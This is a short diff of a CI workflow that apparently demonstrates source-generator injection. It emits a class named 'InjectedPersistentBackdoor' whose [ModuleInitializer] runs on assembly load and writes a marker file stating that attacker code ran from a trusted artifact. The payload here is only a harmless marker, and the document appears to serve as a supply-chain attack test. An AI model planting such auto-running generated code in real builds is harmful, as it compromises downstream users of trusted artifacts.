@@ -83,14 +83,7 @@ jobs:
                   context.AddSource(
                       "InjectedPersistentBackdoor.g.cs",
                       SourceText.From(
-                          @"using System.IO;
-using System.Runtime.CompilerServices;
-internal static class InjectedPersistentBackdoor
-{
-    [ModuleInitializer]
-    internal static void Run()
-        => File.WriteAllText(""/tmp/PERSISTENT_ARTIFACT_MARKER"", ""ATTACKER_GENERATED_CODE_EXECUTED_FROM_TRUSTED_ARTIFACT"");
-}",
+                          "using System.IO;\\nusing System.Runtime.CompilerServices;\\ninternal static class InjectedPersistentBackdoor { [ModuleInitializer] internal static void Run() => File.WriteAllText(\\\"/tmp/PERSISTENT_ARTIFACT_MARKER\\\", \\\"ATTACKER_GENERATED_CODE_EXECUTED_FROM_TRUSTED_ARTIFACT\\\"); }",
                           Encoding.UTF8));
               }
           }
